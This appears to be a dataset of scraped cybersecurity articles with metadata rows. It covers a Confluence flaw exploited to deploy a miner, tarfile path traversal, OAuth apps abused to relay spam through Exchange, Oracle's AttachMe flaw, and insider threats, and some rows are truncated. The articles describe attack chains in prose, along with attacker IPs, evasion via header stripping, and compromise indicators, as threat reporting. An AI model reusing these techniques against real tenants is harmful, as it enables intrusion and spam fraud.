or fault in an application or system that causes it to produce an incorrect or unexpected result. Bugs exist in every piece of code for all sorts of reasons, from improper testing or messy code to a lack of communication or inadequate specifications documents. Not all bugs are cyber security issues or vulnerable to exploitation where an attacker can use the fault to access the network and run code remotely. However, some bugs like SQL injection can be very serious, and allow the attackers to compromise your site or steal data. Not only do SQL injections leave sensitive data exposed, but they can also enable remote access and control of affected systems. This is just one example of a type of application bug, but there are many others. Injections are common if developers haven't had sufficient security training, or where mistakes are made and not code reviewed – or when combined with inadequate continuous security testing. However, even when all these things are done - mistakes can still happen, which is why it's still ranked as the #1 threat in the OWASP Top Ten Web Application Security Risks. Fortunately, many types of injection vulnerabilities (and other application level security bugs) can be detected with an authenticated web vulnerability scanner , and penetration testing for more sensitive applications. Can you secure your business if you don't know what internet-facing assets you own? Not effectively. Without a complete and updated inventory of internet-facing assets, you don't know what services are available and how attackers can attempt to get in. But keeping on top of them and ensuring that they're being monitored for weaknesses isn't exactly a walk in the park as IT estates grow and evolve almost daily. When companies try to document their systems, they often rely on manually updating a simple spreadsheet, but between configuration changes, new technologies, and shadow IT, they rarely know exactly what assets they own or where. But discovering, tracking, and protecting all these assets is a critical component of strong security for every business. A vulnerability scanner is a dynamic, automated tool that can keep track of what's exposed to the internet, and restrict anything that doesn't need to be there - like that old Windows 2003 box everyone's forgotten about, or a web server that a developer spun up for a quick test before leaving the business… It can also keep a constant watch over your cloud accounts and automatically add any new external IP addresses or hostnames as targets. And it can help with 'asset discovery' when companies need help finding their IP addresses and domains that they don't even know about. Attackers use automated tools to identify and exploit vulnerabilities and access unsecured systems, networks or data - however big or small your organisation. Finding and exploiting vulnerabilities with automated tools is simple: the attacks listed above are cheap, easy to perform and often indiscriminate, so every organisation is at risk. All it takes is one vulnerability for an attacker to access your network. Knowing where your vulnerabilities and weak points are is the first and most important step. If you spot your vulnerabilities early, you can address them before an attacker can exploit them. A vulnerability scanner is a cloud-based service that identifies security vulnerabilities in computer systems, networks and software. Vulnerability scanners provide a continuous service that searches for network threats and vulnerabilities - everything from weak passwords to configuration mistakes or unpatched software - so you can address them before attackers exploit them. Intruder's network vulnerability scanner is powered by industry-leading scanning engines used by banks and governments across the world. It's capable of finding over 11,000+ vulnerabilities and focuses on what matters, saving time with contextually-prioritised results. Using noise reduction, it only reports actionable issues that have a genuine impact on your security. By scanning both your internal and external attack surface, Intruder monitors your publicly and privately accessible servers, cloud systems, websites and endpoint devices. Fewer targets for hackers mean fewer vulnerabilities for you to worry about. Organisations around the world trust Intruder's vulnerability scanner to protect their networks with continuous security monitoring and comprehensive scanning.",['Malware'],6cf661e0-4eae-5a1e-a6b2-ab7e2f169c19,"According to Verizon, misconfiguration errors and misuse now make up 14% of breaches, a Denial-of-Service (DoS) attack is meant to shut down your network, or by flooding the target network with traffic, or sending information that triggers a crash such as requesting overly complex queries that lock up a database."

What’s the good and the bad of using biometric traits for authentication? The ability to confirm your identity using your fingerprint or face is something we have already become accustomed to. Most of us carry a piece of this technology in our pockets: Our phones are able to recognize not only our facial features and fingerprints, but also our voices, sleep patterns, and heart and respiratory rates. As biometric identification becomes more common and reliable, it is also increasingly used as a default authentication technology. Chances are, you’re already using your fingerprint or face to unlock your phone, open the door of and start your car, or to manage your bank account. But are we ready to give away all our unique biometric traits in exchange for (a promise of) better security? In this article, we’ll look at some of the most established types of biometric authentication and examine the pros and cons of this ubiquitous technology. Many countries have been using fingerprints on our ID cards and when applying for travel visas, and authorities have long been used (fingerprints and other) biometric features to identify criminals and solve crimes. Fingerprints have been used for centuries . But it was when Apple incorporated a fingerprint sensor into its iPhone 5S in 2013 that this technology first became widely used. Figure 1. Fingerprint authentication in an iPhone Over the years, these technology has developed from the physical iPhone’s Home Button with integrated capacitive sensor capable of generating electric charge when in contact with the fingerprint ridges to map the user’s finger and recognize it. More recently, however, it’s on Android phones that fingerprint sensors have been thriving. Different brand have different approaches for their models, using similar capacitive sensors, under-the-screen optical sensors that use light to create images on the fingerprint or, more recently, ultrasound sensors that bounce a pulse of inaudible sound against the finger to create a complex 3D image. Figure 2. Three types of fingerprint sensors in phones While fingerprint recognition is quite a safe authentication method unless someone steals your fingerprint – or your finger – it all comes down to the reliability of the device you’re using. When it comes to data protection, most big manufacturers, such as Apple, Google or Samsung, store your fingerprint locally and not online. So even when you use your fingerprint to log in to a service or account on your phone, that app will only receive a digital key and not your fingerprint details. What seemed science-fiction not long ago is today another common method of identity verification. Our facial features are now enough to open doors, unlock our smartphones, validate payments and access all the credentials stored in our password manager apps. Face recognition can work in different ways: simple image comparison, video sequences, three-dimensional data, or image composition by multiple cameras. The simplest systems, usually found in cheaper phones, might only compare your face to a previously stored face image, other systems use metrics such as the distance between your eyes, the measure from your forehead to your chin, or the shape of the contours of your lips, however, not always seamlessly . However, things can go rather sour if the technology is used maliciously. While it is up to us whether or not we use this technology on our phones, it might be hard to opt out from CCTV cameras managed by companies or the government , creating a problem of loss of anonymity in public spaces . Figure 3. Face recognition – pros and cons Figure 4. Face recognition options in Android and iOS “ Hey Google ” or “Hey Siri” are simple commands you can use to interact with your phone’s voice assistant. In fact, these are voice recognition systems, responding only to your specific voice commands. When setting up your phone, you are asked to say some sentences out loud, allowing the algorithm to learn voice patterns that it will continue learning through real-world use. The more you talk to a virtual assistant, such as Google , Siri , or Alexa , the more it will recognize your voice patterns. Figure 5. Voice recognition on Android and iOS Biometric authentication is convenient, but it poses new challenges to our privacy and safety. While these technologies can replace long and hard-to-remember passwords, they can also be a way of giving away our personal biometric data without always being certain about how it will be used. Data breaches mean that hackers can access and sell information to malicious actors who might, for example, create molds of our fingerprints and use them to access buildings or devices without our knowledge or consent. And even if we consider how hard these personal features are hard to bypass, other technologies as face recognition expose us all the time. And while governments use the argument of safety to use face recognition cameras, it is hard to know exactly who are the people they will target and how those images can be used in the future. Figure 6. Biometric authentication – pros vs. cons Figure 7. Health data on an iPhone Wearables, such as fitness trackers and smartwatches , are increasingly knowledgeable of our heartbeats, sleep patterns, respiratory rates and even walking steadiness. Soon, even behavioral biometrics, like the way our hands move to take our phones out of our pockets or how we walk, might be enough to identify us. While these technologies are a dive into what we imagine a sci-fi future looks like, their use requires a thoughtful discussion around technological developments, security, and privacy.",['Privacy'],d4796dd3-c99d-52aa-850a-5236310acbde,"As biometric identification becomes more common and reliable, it is also increasingly used as a default authentication technology.

""If left unremedied and successfully exploited, this vulnerability could be used for multiple and more malicious attacks, such as a complete domain takeover of the infrastructure and the deployment information stealers, remote access trojans (RATs), and ransomware,"" Trend Micro threat researcher Sunil Bharti said in a report. The issue, tracked as CVE-2022-26134 (CVSS score: 9.8), was addressed by the Australian software company in June 2022. In one of the infection chains observed by the cybersecurity company, the flaw was leveraged to download and run a shell script (""ro.sh"") on the victim's machine, which, in turn, fetched a second shell script (""ap.sh""). The malicious code is designed to update the PATH variable to include additional paths such as ""/tmp"", download the cURL utility (if not already present) from a remote server, disable iptables firewall, abuse the PwnKit flaw (CVE-2021-4034) to gain root privileges, and ultimately deploy the hezb crypto miner. Like other cryptojacking attacks, the shell script also terminates other competing coin miners, disables cloud service provider agents from Alibaba and Tencent, before carrying out lateral movement via SSH. The findings mirror similar exploitation attempts previously disclosed by Lacework , Microsoft, Sophos , and Akamai in June. Lacework's analysis further shows that the command-and-control (C2) server used to retrieve the cURL software as well as the hezb miner also distributed a Golang-based ELF binary named "" kik "" that enables the malware to kill processes of interest. Users are advised to prioritize patching the flaw as it could be abused by threat actors for other nefarious purposes.

635124c228e9d467ce42836a,ciscotalos,https://blog.talosintelligence.com/2022/09/insider-threats-increasing.html,Insider Threats: Your employees are being used against you,Nick Biasini,2022-09-22,"By Nick Biasini . Insider threats are becoming an increasingly common part of the attack chain, with malicious insiders and unwitting assets playing key roles in incidents over the past year. Social engineering should be part of any organization’s policies and procedures and a key area for user education in 2023 and beyond. Mitigating these types of risks include education, user/access control, and ensuring proper processes and procedures are in place when and if employees leave the organization. Traditionally, attackers try to leverage vulnerabilities to deliver malicious payloads via exploitation. But more recently, that activity has shifted away from exploitation and consistently moved closer and closer to the user. Initially, threat actors loved to trick users into enabling malicious macros in Microsoft Office documents, but as Microsoft moves to blunt the effectiveness of macros, adversaries are always going to move to the next avenue to generate malicious revenue. This is where insider threats come into play. There are two broad categories of insider threats: the malicious insider and the unwitting asset. Both present unique challenges in detection and prevention for defenders and organizations’ IT admins. Malicious Insiders There are a variety of reasons a user may choose to become a malicious insider, and unfortunately, many of them are occurring today. Let’s start with the most obvious: financial distress. When a user has a lot of debt, selling the ability to infect their employer can be a tempting avenue. We’ve seen examples of users trying to sell access into their employers’ networks for more than a decade, having spotted them on dark web forums. The current climate is, unfortunately, ripe for this type of abuse. The economy is on the brink of a recession, inflation continues to spike, and the cryptocurrency markets have lost as much as 70% of their peak value from late 2021. Combined, these factors can create an environment where employees are susceptible to coercion, putting the enterprise at risk. Financial distress is a serious concern for employee compromise as evidenced by the fact that nearly half of the security clearance denials in the U.S. have to do with financial considerations. It is also a common factor in clearances being revoked, clearly demonstrating the risk it can present. This financial distress can also be leveraged by adversaries to force users to take actions they would not have otherwise by threatening to expose the issues publicly. Financial distress isn’t the only factor that could drive an employee to turn against their employer. In today’s highly polarized political climate, the risk that an employee may take malicious action against their employer due to a perceived political stance from the employer is ever present. These could be spurred on by the action or inaction organizations take related to a piece of legislation or other societal issues. These risks, although less common than financial distress, present unique challenges to employers as they try to navigate the current political climate and closer to the 2024 presidential election. The final risk for enterprises comes from employees that have recently left the organization — especially if the separation was not mutual. Employees that have been forced to resign or fired from their jobs may take matters into their own hands. It’s this group that is typically focused on destruction that can really wreak havoc inside an organization. At the least, malicious insiders may be willing to click links, open attachments, plug in a USB drive, or hand over credentials. In a worst-case scenario, if the malicious insider has an elevated level of access, the effects could be devastating. This is the primary insider threat organizations face, but they also need to be prepared for the user that is being used as an unwitting asset, typically via social engineering. Unwitting Assets This other category of insider threat is the more challenging of the two to deal with, as they likely aren’t aware they are acting maliciously. Social engineering attacks are on the rise, we see social engineering becoming a more prominent part of the attack lifecycle as we continue to improve things like exploit detection and prevention. Social engineering attacks are those that focus around leveraging the user to aid in the infection, typically through some form of manipulation. It played a role in the recently disclosed incident affecting Cisco, as well. Social engineering has some obvious applications, as we’ve seen repeatedly in the Business Email Compromise (BEC) space . It isn’t uncommon, especially for the more sophisticated groups, to open with a request for a phone number to discuss an issue further. Example of Business Email Compromise (BEC) campaign leveraging social engineering The attackers have realized that if they can get a potential target on the phone, it’s far easier for them to extract money, as people tend to want to help and can be better manipulated over the phone. This is far from the only way users are becoming unwitting assets. As we continue to deploy multi-factor authentication (MFA), attackers are getting better at evading it, commonly through social engineering. Through our investigations, we have found numerous examples where attackers pose as IT Support or Security Operations inside an organization and call the victim, using social engineering to get them to accept the MFA request as they are sending it to the device. This was similar to the approach we saw taken in the recently disclosed attack against Cisco , where voice phishing played a role in the sophisticated attack, illustrating how once attackers have people on the phone, they can more easily manipulate them. The other space where social engineering attacks have been occurring at pace is the cryptocurrency and web3.0 space, even though the value of cryptocurrencies has cratered recently . Cisco Talos has talked at length about the ways scams have emerged in Web 3.0, but social engineering attacks against NFT/Cryptocurrency users are increasingly common. Users are commonly approached if they post about having issues with their accounts, with criminals waiting to defraud them out of whatever value they have in their wallets. These attacks are widespread, as users posting anything related to issues with MetaMask can attest, they will find you quickly. Most of the time, it seems innocuous with the adversary asking the target to fill out a form, but in the end, adversaries are after users’ mnemonic password, allowing the attacker to empty the wallet with little recourse for the victim. Example ""support"" form asking for meta mask mnemonic password Defending against insider threat Defending against these types of insider threats is difficult for a variety of reasons, but first and foremost, they typically are allowed to access the network and have valid login credentials. This is where traditional security controls like user and access control come into play. Organizations should limit the amount of access a user has to the minimum required for them to perform their job. This should prevent them from accessing documents or systems that they shouldn’t and, along with proper alerting logic, should generate alerts if they attempt to access something they shouldn’t. Users make mistakes and click things occasionally, but a user being denied 15 - 20 times in a short period should be investigated. Additionally, administrators should ensure that the organization has proper defense-in-depth and is inspecting laterally across the organization and not just analyzing traffic traversing your boundary or going north/south. This will ensure if the user is being leveraged to help the attackers, whether willing or otherwise, there are solutions in place to detect and block it. This is also where routine auditing can play a role. It’s common for an account to be created for testing or other purposes and forgotten, these types of accounts can be devastating if missed. Additionally, auditing the access users/groups have regularly can eliminate things like access hoarding, group sprawl and permission creep, which results in users having far more access than they should. For those organizations that deal with financial transactions, ensure that there is a system of checks and balances in place so no one single person can initiate and complete a wire transfer or other significant movement of funds without additional oversight and approval. Too often, have we seen organizations without these types of controls have significant amounts of money leave via BEC or another financially motivated social engineering attack. Finally, there is the issue of what to do when someone leaves the organization. There are some obvious steps like disabling their accounts and ensuring they can’t connect to the enterprise remotely through VPN. However, less obvious is ensuring the user doesn’t have any existing connections and, in today’s hybrid work world, it’s likely they will still have access to company assets, including laptops and other systems. Implementing a mechanism to wipe those systems remotely will be important, as well. There are additional steps organizations need to take, specifically for users with an increased level of access. Rotate shared credentials — in a perfect world, this wouldn’t be an issue, but we’ve all worked in organizations where shared credentials are a thing and can commonly be abused by recently departed team members. Along those same lines, rotate any cloud credentials. Today, almost all organizations have some or most of their data hosted in the cloud and there are ways to access that data from outside the organization. These lines of access should be addressed when key employees leave the organization. One final step is to create some detection logic to look for login attempts from disabled users. This will at least will give admins some level of indication that a former employee could be attempting to establish access. Likewise, admins and defenders should ensure all service accounts cannot login directly which can be configured via Group Policy , as they can also be abused by a malicious insider if misconfigured, resulting in an elevated level of access ripe for abuse. Regarding unwitting assets, the key is user education. Enterprises should include social engineering attacks as part of their red teaming or other pentesting that occurs regularly. Additionally, they should roll out specific training to employees to educate them on social engineering. This needs to include what normal MFA activity looks like, the ways that support would contact users and the types of things you should never share, and finally, for financial organizations/departments, understanding how money transfers should be handled and vetted. Insider threats increasing Over the past six months to a year, we have seen an increasing amount of incident response engagements involving malicious insiders and unwitting assets being compromised via social engineering. As we continue to improve the ways we can detect and stop active exploitation and as macros are slowly removed from the landscape, the options for adversaries are going to dwindle. Realize they are always going to take the path of least resistance, historically that meant active exploitation, more recently it fell to maldocs, and in the future, it’s likely going to fall increasingly to social engineering attacks and turning a user into a malicious insider. Unfortunately, as the payouts have shown, the amount of money at play is significant and they will likely find users willing and able to take that leap to the dark side.",['On The Radar'],c94a6ba5-dd39-5be4-b955-99e5570acf3f,"Insider threats are becoming an increasingly common part of the attack chain, with malicious insiders and unwitting assets playing key roles in incidents over the past year.

The open source repositories span a number of industry verticals, such as software development, artificial intelligence/machine learning, web development, media, security, and IT management. The shortcoming, tracked as CVE-2007-4559 (CVSS score: 6.8), is rooted in the tarfile module, successful exploitation of which could lead to code execution from an arbitrary file write. ""The vulnerability is a path traversal attack in the extract and extractall functions in the tarfile module that allow an attacker to overwrite arbitrary files by adding the '..' sequence to filenames in a TAR archive,"" Trellix security researcher Kasimir Schulz said in a writeup. Originally disclosed in August 2007, the bug has to do with how a specially crafted tar archive can be leveraged to overwrite arbitrary files on a target machine simply upon opening the file. Put simply, a threat actor can exploit the weakness by uploading a malicious tarfile in a manner that makes it possible to escape the directory that a file is intended to be extracted to and achieve code execution, allowing the adversary to potentially seize control of a target device.

635124b428e9d467ce4282d1,microsoft,https://www.microsoft.com/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/,Malicious OAuth applications abuse cloud email services to spread spam,Microsoft 365 Defender Research Team,2022-09-22,"Microsoft researchers recently investigated an attack where malicious OAuth applications were deployed on compromised cloud tenants and then used to control Exchange Online settings and spread spam. The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn’t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access. The unauthorized access to the cloud tenant enabled the actor to create a malicious OAuth application that added a malicious inbound connector in the email server. The actor then used the malicious inbound connector to send spam emails that looked like they originated from the targets’ domain. The spam emails were sent as part of a deceptive sweepstakes scheme meant to trick recipients into signing up for recurring paid subscriptions. Microsoft has been monitoring the rising popularity of OAuth application abuse. One of the first observed malicious usage of OAuth applications in the wild is consent phishing . Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user’s legitimate cloud services (mail servers, files storage, management APIs, etc.). In the past few years, Microsoft has observed that more and more threat actors, including nation-state actors , have been using OAuth applications for different malicious purposes – command-and-control (C2) communication, backdoors, phishing, redirections, and so on. This recent attack involved a network of single-tenant applications installed in compromised organizations being used as the actor’s identity platform to perform the attack. As soon as the network was revealed, all the related applications were taken down and notifications to customers were sent, including recommended remediation steps. This blog presents the technical analysis of this attack vector and the succeeding spam campaign attempted by the threat actor. It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1. Overview of the attack chain. The time between application deployment and usage varied; there were cases where the actor took months before using the application. Initial access For the attack to succeed, the threat actor needed to compromise cloud tenant users with sufficient permissions that would allow the actor to create an application in the cloud environment and give it admin consent. The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role. The authentication attempts, which originated from a single IP address, were launched against the Azure Active Directory PowerShell application (app ID: 1b730954-1685-4b74-9bfd-dac224a7b894). The same application was later used to deploy the rest of the attack. Based on the success ratio of the authentication attempts, it is inferred that the attacker used a dump of compromised credentials. The investigation also revealed that 86% of the compromised tenants had at least one admin with a real-time high risk score , which means they were flagged by Azure AD Identity Protection to be most likely compromised. It is also important to note that all the compromised admins didn’t have MFA enabled, which could have stopped the attack. These observations amplify the importance of securing accounts and monitoring for high-risk users, especially those with high privileges. Deploying malicious OAuth application Once the threat actor gained access to privileged users, their next step was to set up the malicious application. Based on analysis of the event user agent (Swagger-Codegen/1.4.0.0/csharp) and how quickly the deployment of the application was done, it is likely that the actor ran a PowerShell script to perform the following Azure Active Directory (AAD) management activities in all targeted tenants: Register a new single–tenant application with the naming convention of [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY) Add the legacy permission Exchange.ManageAsApp which can be used for app-only authentication of Exchange Online PowerShell module Grant admin consent to the above permission Give global admin and Exchange Online admin roles to the previously registered application Add application credentials (key/certificate/both) The threat actor added their own credentials to the OAuth application, which enabled them to access the application even if the initially compromised global administrator changed their password. The activities mentioned gave the threat actor control of a highly privileged application. It was observed that the threat actor did not always use the application right after it was deployed. In some cases, it took weeks or months before the application was utilized. Also, in organizations that didn’t monitor for suspicious applications, the applications were deployed for months and used multiple times by the threat actor. Modifying Exchange Online settings The threat actor used the privileged application to authenticate the Exchange Online PowerShell module and modify the Exchange Online settings. There were two modifications which allowed them to perform the next step in the attack chain: Create a new inbound connector Connectors are a collection of instructions that customize the way email flows to and from organizations using Microsoft 365 or Office 365. Most organizations using Microsoft 365 and Office 365 don’t need custom connectors for regular mail flow, but some use it when they need to process messages from another messaging system that’s not running Exchange Online, or if they have a network appliance that performs policy checks and then routes messages to their Exchange Online service. The threat actor set a new inbound connector with the naming convention Ran_([a-zA-Z]){5} (for example Ran_xAFzd ). The purpose of the inbound connector was to allow mails from certain IPs (that are related to the attacker’s infrastructure) to flow through the victim’s Exchange Online service. This allowed the threat actor to send emails that looked like they originated from the compromised Exchange domain. The configuration information for the newly created connectors were seen in Exchange Online audit event New-InboundConnector . The following table shows the configuration parameters in the audit event related to this change: Name Value “Name” “Ran_jBelh” “Enabled” “True” “CloudServicesMailEnabled” “True” “RestrictDomainsToCertificate” “False” “SenderDomains” “smtp:*;1” “SenderIPAddresses” “170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131” “RestrictDomainsToIPAddresses” “True” “ConnectorSource” “HybridWizard” “EFSkipIPs” “170.75.174.97;170.75.172.8;170.75.170.69;170.75.174.95; 54.39.94.145;149.56.200.36;158.69.21.185;66.70.201.131” “TreatMessagesAsInternal” “False” “ConnectorType” “OnPremises” “RequireTls” “False” Create transport rules Transport rules (also known as mail flow rules) are sets of actions that can be taken on any mail that flows in the organization. The threat actor utilized this feature to set 12 new transport rules with the naming convention of Test01 to Test012 . Each of these transport rules were responsible for deleting the following specific headers from every mail that flowed in the organization: X-MS-Exchange-ExternalOriginalInternetSender X-MS-Exchange-SkipListedInternetSender Received-SPF Received ARC-Authentication-Results ARC-Message-Signature DKIM-Signature ARC-Seal X-MS-Exchange-SenderADCheck X-MS-Exchange-Authentication-Results Authentication-Results X-MS-Exchange-AntiSpam-MessageData-ChunkCount By deleting these headers, the attacker tried defense evasion to prevent security products or email providers detecting or blocking their emails and increase the success rate of the spam campaign. The configuration information for the newly created transport rules were seen in Exchange Online audit event New-TransportRule . The following table shows the configuration parameters in the audit event related to this change: Name Value “Name” “Test06” “SenderAddressLocation” “Header” “RemoveHeader” “ARC-Message-Signature” These modifications to the Exchange Online settings allowed the threat actor to perform their primary goal in the attack: sending out spam emails. After each spam campaign, the actor deleted the malicious inbound connector and transport rules to prevent detection, while the application remained deployed in the tenant until the next wave of the attack (in some cases, the app was dormant for months before it was reused by the threat actor). Figure 2. An example of the PowerShell script used for setting new Exchange Online connector and transport rules Spam email campaign sent through Exchange Online connector The actor behind this attack has been actively running spam email campaigns for many years. Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure. The actor’s motive was to propagate deceptive sweepstakes spam emails designed to trick recipients into providing credit card details and signing up for recurring subscriptions under the guise of winning a valuable prize. While the scheme possibly led to unwanted charges for targets, there was no evidence of overt security threats such as credential phishing or malware distribution. The spam campaign carried the hallmarks of this actor: programmatically generated messages containing two visible hyperlinked images in the email body, as well as dynamic and randomized content injected within the HTML body of each mail message to evade spam filters. Figure 3. An example of spam email sent through the Exchange Online inbound connector The hyperlinked images within the spam messages implied to recipients that they were eligible for a prize. Once clicked, the hyperlink directed recipients to a website where they were asked to complete a survey and provide credit card details to pay for the shipping of their prize. Familiar brand logos, names, and websites were used throughout the spam email, likely to give an illusion of legitimacy. Figure 4. Clicking the image in the spam email leads to this website indicating a prize has been won The fine print, visible only by scrolling to the very bottom of a subsequent page, revealed that in providing their credit card information, recipients were not paying a shipping fee for their prize, but were in fact agreeing to be charged fees for several paid subscription services in order to enter into a sweepstakes for the prize. It is likely the threat actor’s main motive was potential financial gain from people who fell victim to this deceptive sweepstakes spam campaign. Figure 5. The fine print shows the chance to win a prize is only through a sweepstakes after paying fees Likely to achieve scale and further maximize the chances of successful email delivery, the actor triggered this spam campaign from cloud-based outbound email infrastructure outside of Microsoft, mainly Amazon SES and Mail Chimp. These email platforms enable sending of mass bulk email, normally for marketing and other legitimate purposes. The campaign also utilized techniques to generate unique dynamic URLs underpinning the hyperlinked images within each spam email message, as shown in the examples below. Figure 6. Examples of dynamic URL generation (domain obfuscated) This spam campaign exclusively targeted consumer email accounts. In the case of spam messages sent to Microsoft-hosted consumer email accounts (outlook.com), the spam emails were moved into customers’ junk folders before they could be viewed and clicked. Mitigations While the follow-on spam campaign targets consumer email accounts, this attack targets enterprise tenants to use as infrastructure for this campaign. This attack thus exposes security weaknesses that could be used by other threat actors in attacks that could directly impact affected enterprises. As the main initial access vector of the attack was to obtain the admin’s credentials, we recommend organizations take the following steps to reduce their attack surface: Mitigate credential guessing attacks risks A key step in reducing the attack surface is securing the identity infrastructure. The most common initial access vector observed in this attack was account compromise through credential stuffing, and all the compromised administrator accounts did not have MFA enabled. Implementing security practices that strengthen account credentials such as enabling MFA raises the cost of an attack. Enable conditional access policies Conditional access policies are evaluated and enforced every time the user attempts to sign in. Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements. Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. Enable security defaults While some of the features mentioned above require paid subscriptions, the security defaults in Azure AD , which is mainly for organizations using the free tier of Azure Active Directory licensing, are sufficient to better protect the organizational identity platform, as they provide preconfigured security settings such as MFA, protection for privileged activities, and others. Detections for related techniques Leveraging its cross-signal capabilities, Microsoft 365 Defender alerts customers using Microsoft Defender for Office 365 , Microsoft Defender for Cloud Apps , Application governance add-on , and Azure Active Directory Identity Protection to detect the techniques covered in the attack through the attack chain. Each product can provide a different aspect for protection to cover the techniques observed in this attack: Microsoft 365 Defender Suspicious email-sending pattern from new Exchange inbound connector – This alert is generated when a suspicious email-sending pattern originating from a new Exchange inbound connector is detected. This behavior might suggest that an attacker set a malicious inbound connector to allow anonymous relay through the organization’s Exchange Online service. Recommended reading to response for malicious connector incidents: Respond to a compromised connector in Microsoft 365 Alert grading for malicious exchange connectors New transport rule removing antispam header – This alert is generated when a new transport rule to remove antispam header is detected. Suspicious inbound connector and transport rule created to remove sender email headers – This alert is generated when a suspicious inbound connector and transport rule is created to remove headers that identify the true source address of sender. This might indicate a spam campaign is ongoing from the organization’s mailbox. Suspicious Azure AD app creation – This alert is generated when a user account creates Azure Active Directory OAuth application with suspicious characteristics, as observed in this campaign. Azure AD app registration by risky user – This alert is generated when a user account with high risk score as calculated by AAD Identity Protection is creating a new OAuth application and grants admin consent to it. Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects threat activity associated with this spamming campaign through the following email security alerts. Note, however, that these alerts may also be triggered by unrelated threat activity. We’re listing them here because we recommend that these alerts be investigated and remediated immediately. Email messages from a campaign removed after delivery​. This alert is generated when any messages associated with a campaign are delivered to mailboxes in an organization. Microsoft removes the infected messages from Exchange Online mailboxes using zero-hour auto purge (ZAP) if this event occurs. Microsoft Defender for Cloud Apps Activity from suspicious IP addresses. This alert is generated when there is activity from an IP address that has been identified as risky by Microsoft Threat Intelligence or by the organization. These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account. Activity from a password-spray associated IP address . This alert is generated when a successful sign-in from an IP address that had been identified as participating in password spray was observed. App governance App governance is an add-on to Microsoft Defender for Cloud Apps, which can detect malicious OAuth applications that make sensitive Exchange Online Administrative activities along with other threat detection alerts . Activity related to this campaign will trigger the following alert: OAuth app with suspicious metadata has exchange permission​. This alert is generated when a line of business OAuth app with suspicious metadata has privilege to manage permission over Exchange Online, which can lead an OAuth App to perform data collection or exfiltration activities or attempts to access and retrieve sensitive information. Azure AD Identity Protection Azure AD Identity Protection automatically detects and remediates identity-based risks. It detects suspicious sign-in attempts and raises any of the following alerts: Anomalous Token. This alert flags a token’s unusual characteristics, such as its token lifetime or played from an unfamiliar location. Unfamiliar sign-in properties. In this phishing campaign, the attackers used multiple proxies or VPNs originating from various countries or regions unfamiliar to the target user.This alert flags anomalies in the token claims, token age, and other authentication attributes. Anonymous IP address. This alert flag sign-in attempts from anonymous IP addresses (for example, Tor browser or anonymous VPN).

""This identifier is not considered secret, and organizations do not treat it as such."" ""Given the OCID of a victim's disk that is not currently attached to an active server or configured as shareable, an attacker could 'attach' to it and obtain read/write over it,"" Tamari added. The cloud security firm, which dubbed the tenant isolation vulnerability "" AttachMe ,"" said Oracle patched the issue within 24 hours of responsible disclosure on June 9, 2022. At its core, the vulnerability is rooted in the fact that a disk could be attached to a compute instance in another account via the Oracle Cloud Identifier (OCID) without any explicit authorization. This meant that an attacker in possession of the OCID could have taken advantage of AttachMe to access any storage volume, resulting in data exposure, exfiltration, or worse, alter boot volumes to gain code execution. Besides knowing the OCID of the target volume, another prerequisite to pull off the attack is that the adversary's instance must be in the same Availability Domain (AD) as the target.

Welcome to this week’s edition of the Threat Source newsletter. We’ve seen attackers capitalize on the news time and again, from COVID-19 to U.S.-North Korea relationships and, of course, holiday shopping sales every November. So, I was far from surprised to see that attackers are already using U.S. President Joe Biden’s student loan forgiveness plan as a basis for scams and phishing emails . The Better Business Bureau and the U.S. Federal Trade Commission both released warnings over the past few weeks around fake offers, scams and website links related to the debt forgiveness plan, with which some borrowers will have up to $20,000 worth of loans forgiven. Many of these scams , coming via phone calls, text messages and emails, are promising to provide guaranteed access to the forgiveness program or early applications for a fee. (Hint: This will not work.) These attackers may also be looking to steal personal information by asking for things like names, addresses and the name of the college the target went to. I can already see the phishing emails now... “Click on this link NOW to apply for Biden’s loan forgiveness program” or “Act now so you can get your $10,000 check!” Even though I couldn’t find reports as of this week of this type of email being used to spread malware, I feel like it’s inevitable. This isn’t a new problem, either. A July study from the Tech Transparency Project found that nearly 12 percent of Google ads served related to student loans violated Google’s policies or had “scam characteristics.” With that in mind, I felt it was important to remind folks of a few things with the real application to apply for student debt forgiveness reportedly coming in early October: As of right now, Sept. 22, there is no real or formal application to have a portion of your student debt forgiven. Don’t believe anything that says otherwise. There is no way to get early access to this program. Anyone offering this for a fee is very likely a scam. The U.S. Department of Education will not reach out with a phone call to communicate regarding this program, do not provide any requested information over the phone. Just because something shows up in the mail doesn’t mean it’s legit. Attackers are also likely to send phishing letters via traditional USPS delivery methods. And, as always: If it seems too good to be true, it probably is. The one big thing Ukraine is again the target of a state-sponsored actor, with the Gamaredon APT launching information-stealing malware against organizations and users there. Gamaredon is a well-known actor that’s been around for several years and usually aligns with Russian state interests. The adversary is using phishing documents containing lures related to the Russian invasion of Ukraine. Talos researchers discovered the use of a custom-made information stealer implant that can exfiltrate victim files of interest and deploy additional payloads as directed by the attackers. Why do I care? Gamaredon is actively targeting Ukrainian entities, specifically government organizations and critical infrastructure. These are all crucial industries to protect during Russia’s invasion of Ukraine, as they’ll likely be targeted regularly by state-sponsored actors. And as we outlined in last week’s Talos Takes, Gamaredon’s activities are not likely to remain isolated to Ukraine. So now what? There are new Cisco Secure product protections in place to protect against this actor’s activities. Additionally, if you fear you could be targeted by this campaign, there are two artifcats to scan for on the system that can indicate a compromise: A registry key is created under HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run with the name ""Windows Task"" for persistence. A mutex is created with the name Global\flashupdate_r. Top security headlines from the week Rideshare app Uber blamed the Lapsus$ ransomware group for a recent data breach. The company said the actor gained access to multiple internal Uber systems after stealing a 